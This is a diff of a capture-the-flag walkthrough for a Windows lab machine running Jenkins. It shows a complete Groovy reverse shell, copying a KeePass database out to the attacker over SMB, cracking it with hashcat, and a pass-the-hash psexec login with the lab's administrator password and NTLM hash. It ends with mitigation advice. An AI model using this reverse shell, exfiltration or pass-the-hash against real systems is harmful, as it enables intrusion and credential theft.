@@ -5,31 +5,37 @@
 sudo nmap -Pn -p- -A -T4 10.129.234.197
 ```
 
-**Results:**
+**Key Findings:**
 ```
 PORT      STATE SERVICE      VERSION
-80/tcp    open  http         Microsoft IIS httpd 10.0
-|_http-title: Ask Jeeves
-|_http-server-header: Microsoft-IIS/10.0
+80/tcp    open  http         Microsoft IIS httpd 10.0 (Ask Jeeves)
 135/tcp   open  msrpc        Microsoft Windows RPC
-445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds
+445/tcp   open  microsoft-ds Windows SMB
 50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
-|_http-server-header: Jetty(9.4.z-SNAPSHOT)
-|_http-title: Error 404 Not Found
 ```
 
+## Enumeration
+### Web Services
+1. **Port 80 (IIS):** Basic static page with no significant functionality
+2. **Port 50000 (Jetty):** 
+   - Directory scan revealed `/askjeeves` (Jenkins instance)
+   - Jenkins version: 2.289.2 (vulnerable to script console RCE)
+
+### SMB Service
+- Anonymous access not permitted
+- Workgroup name: WORKGROUP
+
 ## Exploitation
-### Jenkins Access
-- Discovered Jenkins instance at `http://10.129.234.197:50000/askjeeves`
-- Created project with Groovy reverse shell script:
+### Jenkins Script Console RCE
+1. Created Jenkins project with Groovy reverse shell:
 ```groovy
-String host="10.10.16.39";
-int port=1234;
-String cmd="cmd";
-Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
-Socket s=new Socket(host,port);
-InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
-OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+String host="ATTACKER_IP";
+int port=4444;
+String cmd="cmd.exe";
+Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
+Socket s = new Socket(host,port);
+InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
+OutputStream po = p.getOutputStream(), so = s.getOutputStream();
 while(!s.isClosed()) {
   while(pi.available()>0) so.write(pi.read());
   while(pe.available()>0) so.write(pe.read());
@@ -44,17 +50,47 @@ p.destroy();
 s.close();
 ```
 
-### Initial Access
-- Run the new project with the groovy reverse shell and start a listener
-- Obtained reverse shell as `kohsuke` user
-- Found KeePass database: `C:\Users\kohsuke\Documents\CEH.kdbx`
-- Exfiltrated via SMB:
+2. Obtained reverse shell as `kohsuke`:
+```bash
+nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.39] from (UNKNOWN) [10.129.234.197] 49689
+Microsoft Windows [Version 10.0.10586]
+c:\Program Files (x86)\Jenkins>
+```
+
+### User Flag
 ```cmd
-copy C:\Users\kohsuke\Documents\CEH.kdbx \\10.10.16.39\smb\
+C:\Users\kohsuke\Desktop>type user.txt
+7b0b********************************
+```
+
+## Privilege Escalation
+### KeePass Database Extraction
+1. Discovered password database:
+```cmd
+C:\Users\kohsuke\Documents>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 71A1-6FA1
+12/24/2017  03:47 AM            15,360 CEH.kdbx
+```
+
+2. Transferred to attacker machine via SMB:
+```bash
+# Attacker:
+impacket-smbserver share $(pwd)
+
+# Target:
+copy CEH.kdbx \\ATTACKER_IP\share\
 ```
 
 ### KeePass Cracking
-- Cracked database password with Hashcat:
+1. Extracted hash:
+```bash
+keepass2john CEH.kdbx > hash.txt
+```
+
+2. Cracked password:
 ```bash
 hashcat -m 13400 hash.txt /usr/share/wordlists/rockyou.txt
 ```
@@ -63,28 +99,34 @@ hashcat -m 13400 hash.txt /usr/share/wordlists/rockyou.txt
 ### Database Contents
 ```
 administrator:S1TjAtJHKsugh9oC4VZl
-NTLM HASH: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
+NTLM Hash: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
 ```
 
-### Privilege Escalation
-- Used credentials with Impacket's psexec:
+### Admin Access
 ```bash
 impacket-psexec administrator@10.129.234.197 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
 ```
-- Obtained SYSTEM-level access
 
-## Flags
-### User Flag
-```
-7b0b********************************
-```
-
-### Root Flag
-Located in Alternate Data Stream:
+### Root Flag (Alternate Data Stream)
 ```cmd
-powershell (Get-Content hm.txt -Stream root.txt)
-```
-**Root Flag:**  
-```
+C:\Users\Administrator\Desktop>dir /r
+12/24/2017  03:51 AM                36 hm.txt
+                                    34 hm.txt:root.txt:$DATA
+
+C:\Users\Administrator\Desktop>powershell (Get-Content hm.txt -Stream root.txt)
 afbc********************************
 ```
+
+## Attack Chain Summary
+1. Exploited Jenkins Groovy script console → Initial access
+2. Found KeePass database → Extracted credentials
+3. Cracked KeePass password → Obtained administrator hash
+4. Pass-the-hash attack → SYSTEM access
+5. Retrieved root flag from Alternate Data Stream
+
+## Mitigation Recommendations
+1. Restrict Jenkins script console access
+2. Implement KeePass database encryption best practices
+3. Disable NTLM hashing in domain environment
+4. Monitor for pass-the-hash attacks
+5. Remove Alternate Data Streams containing sensitive data
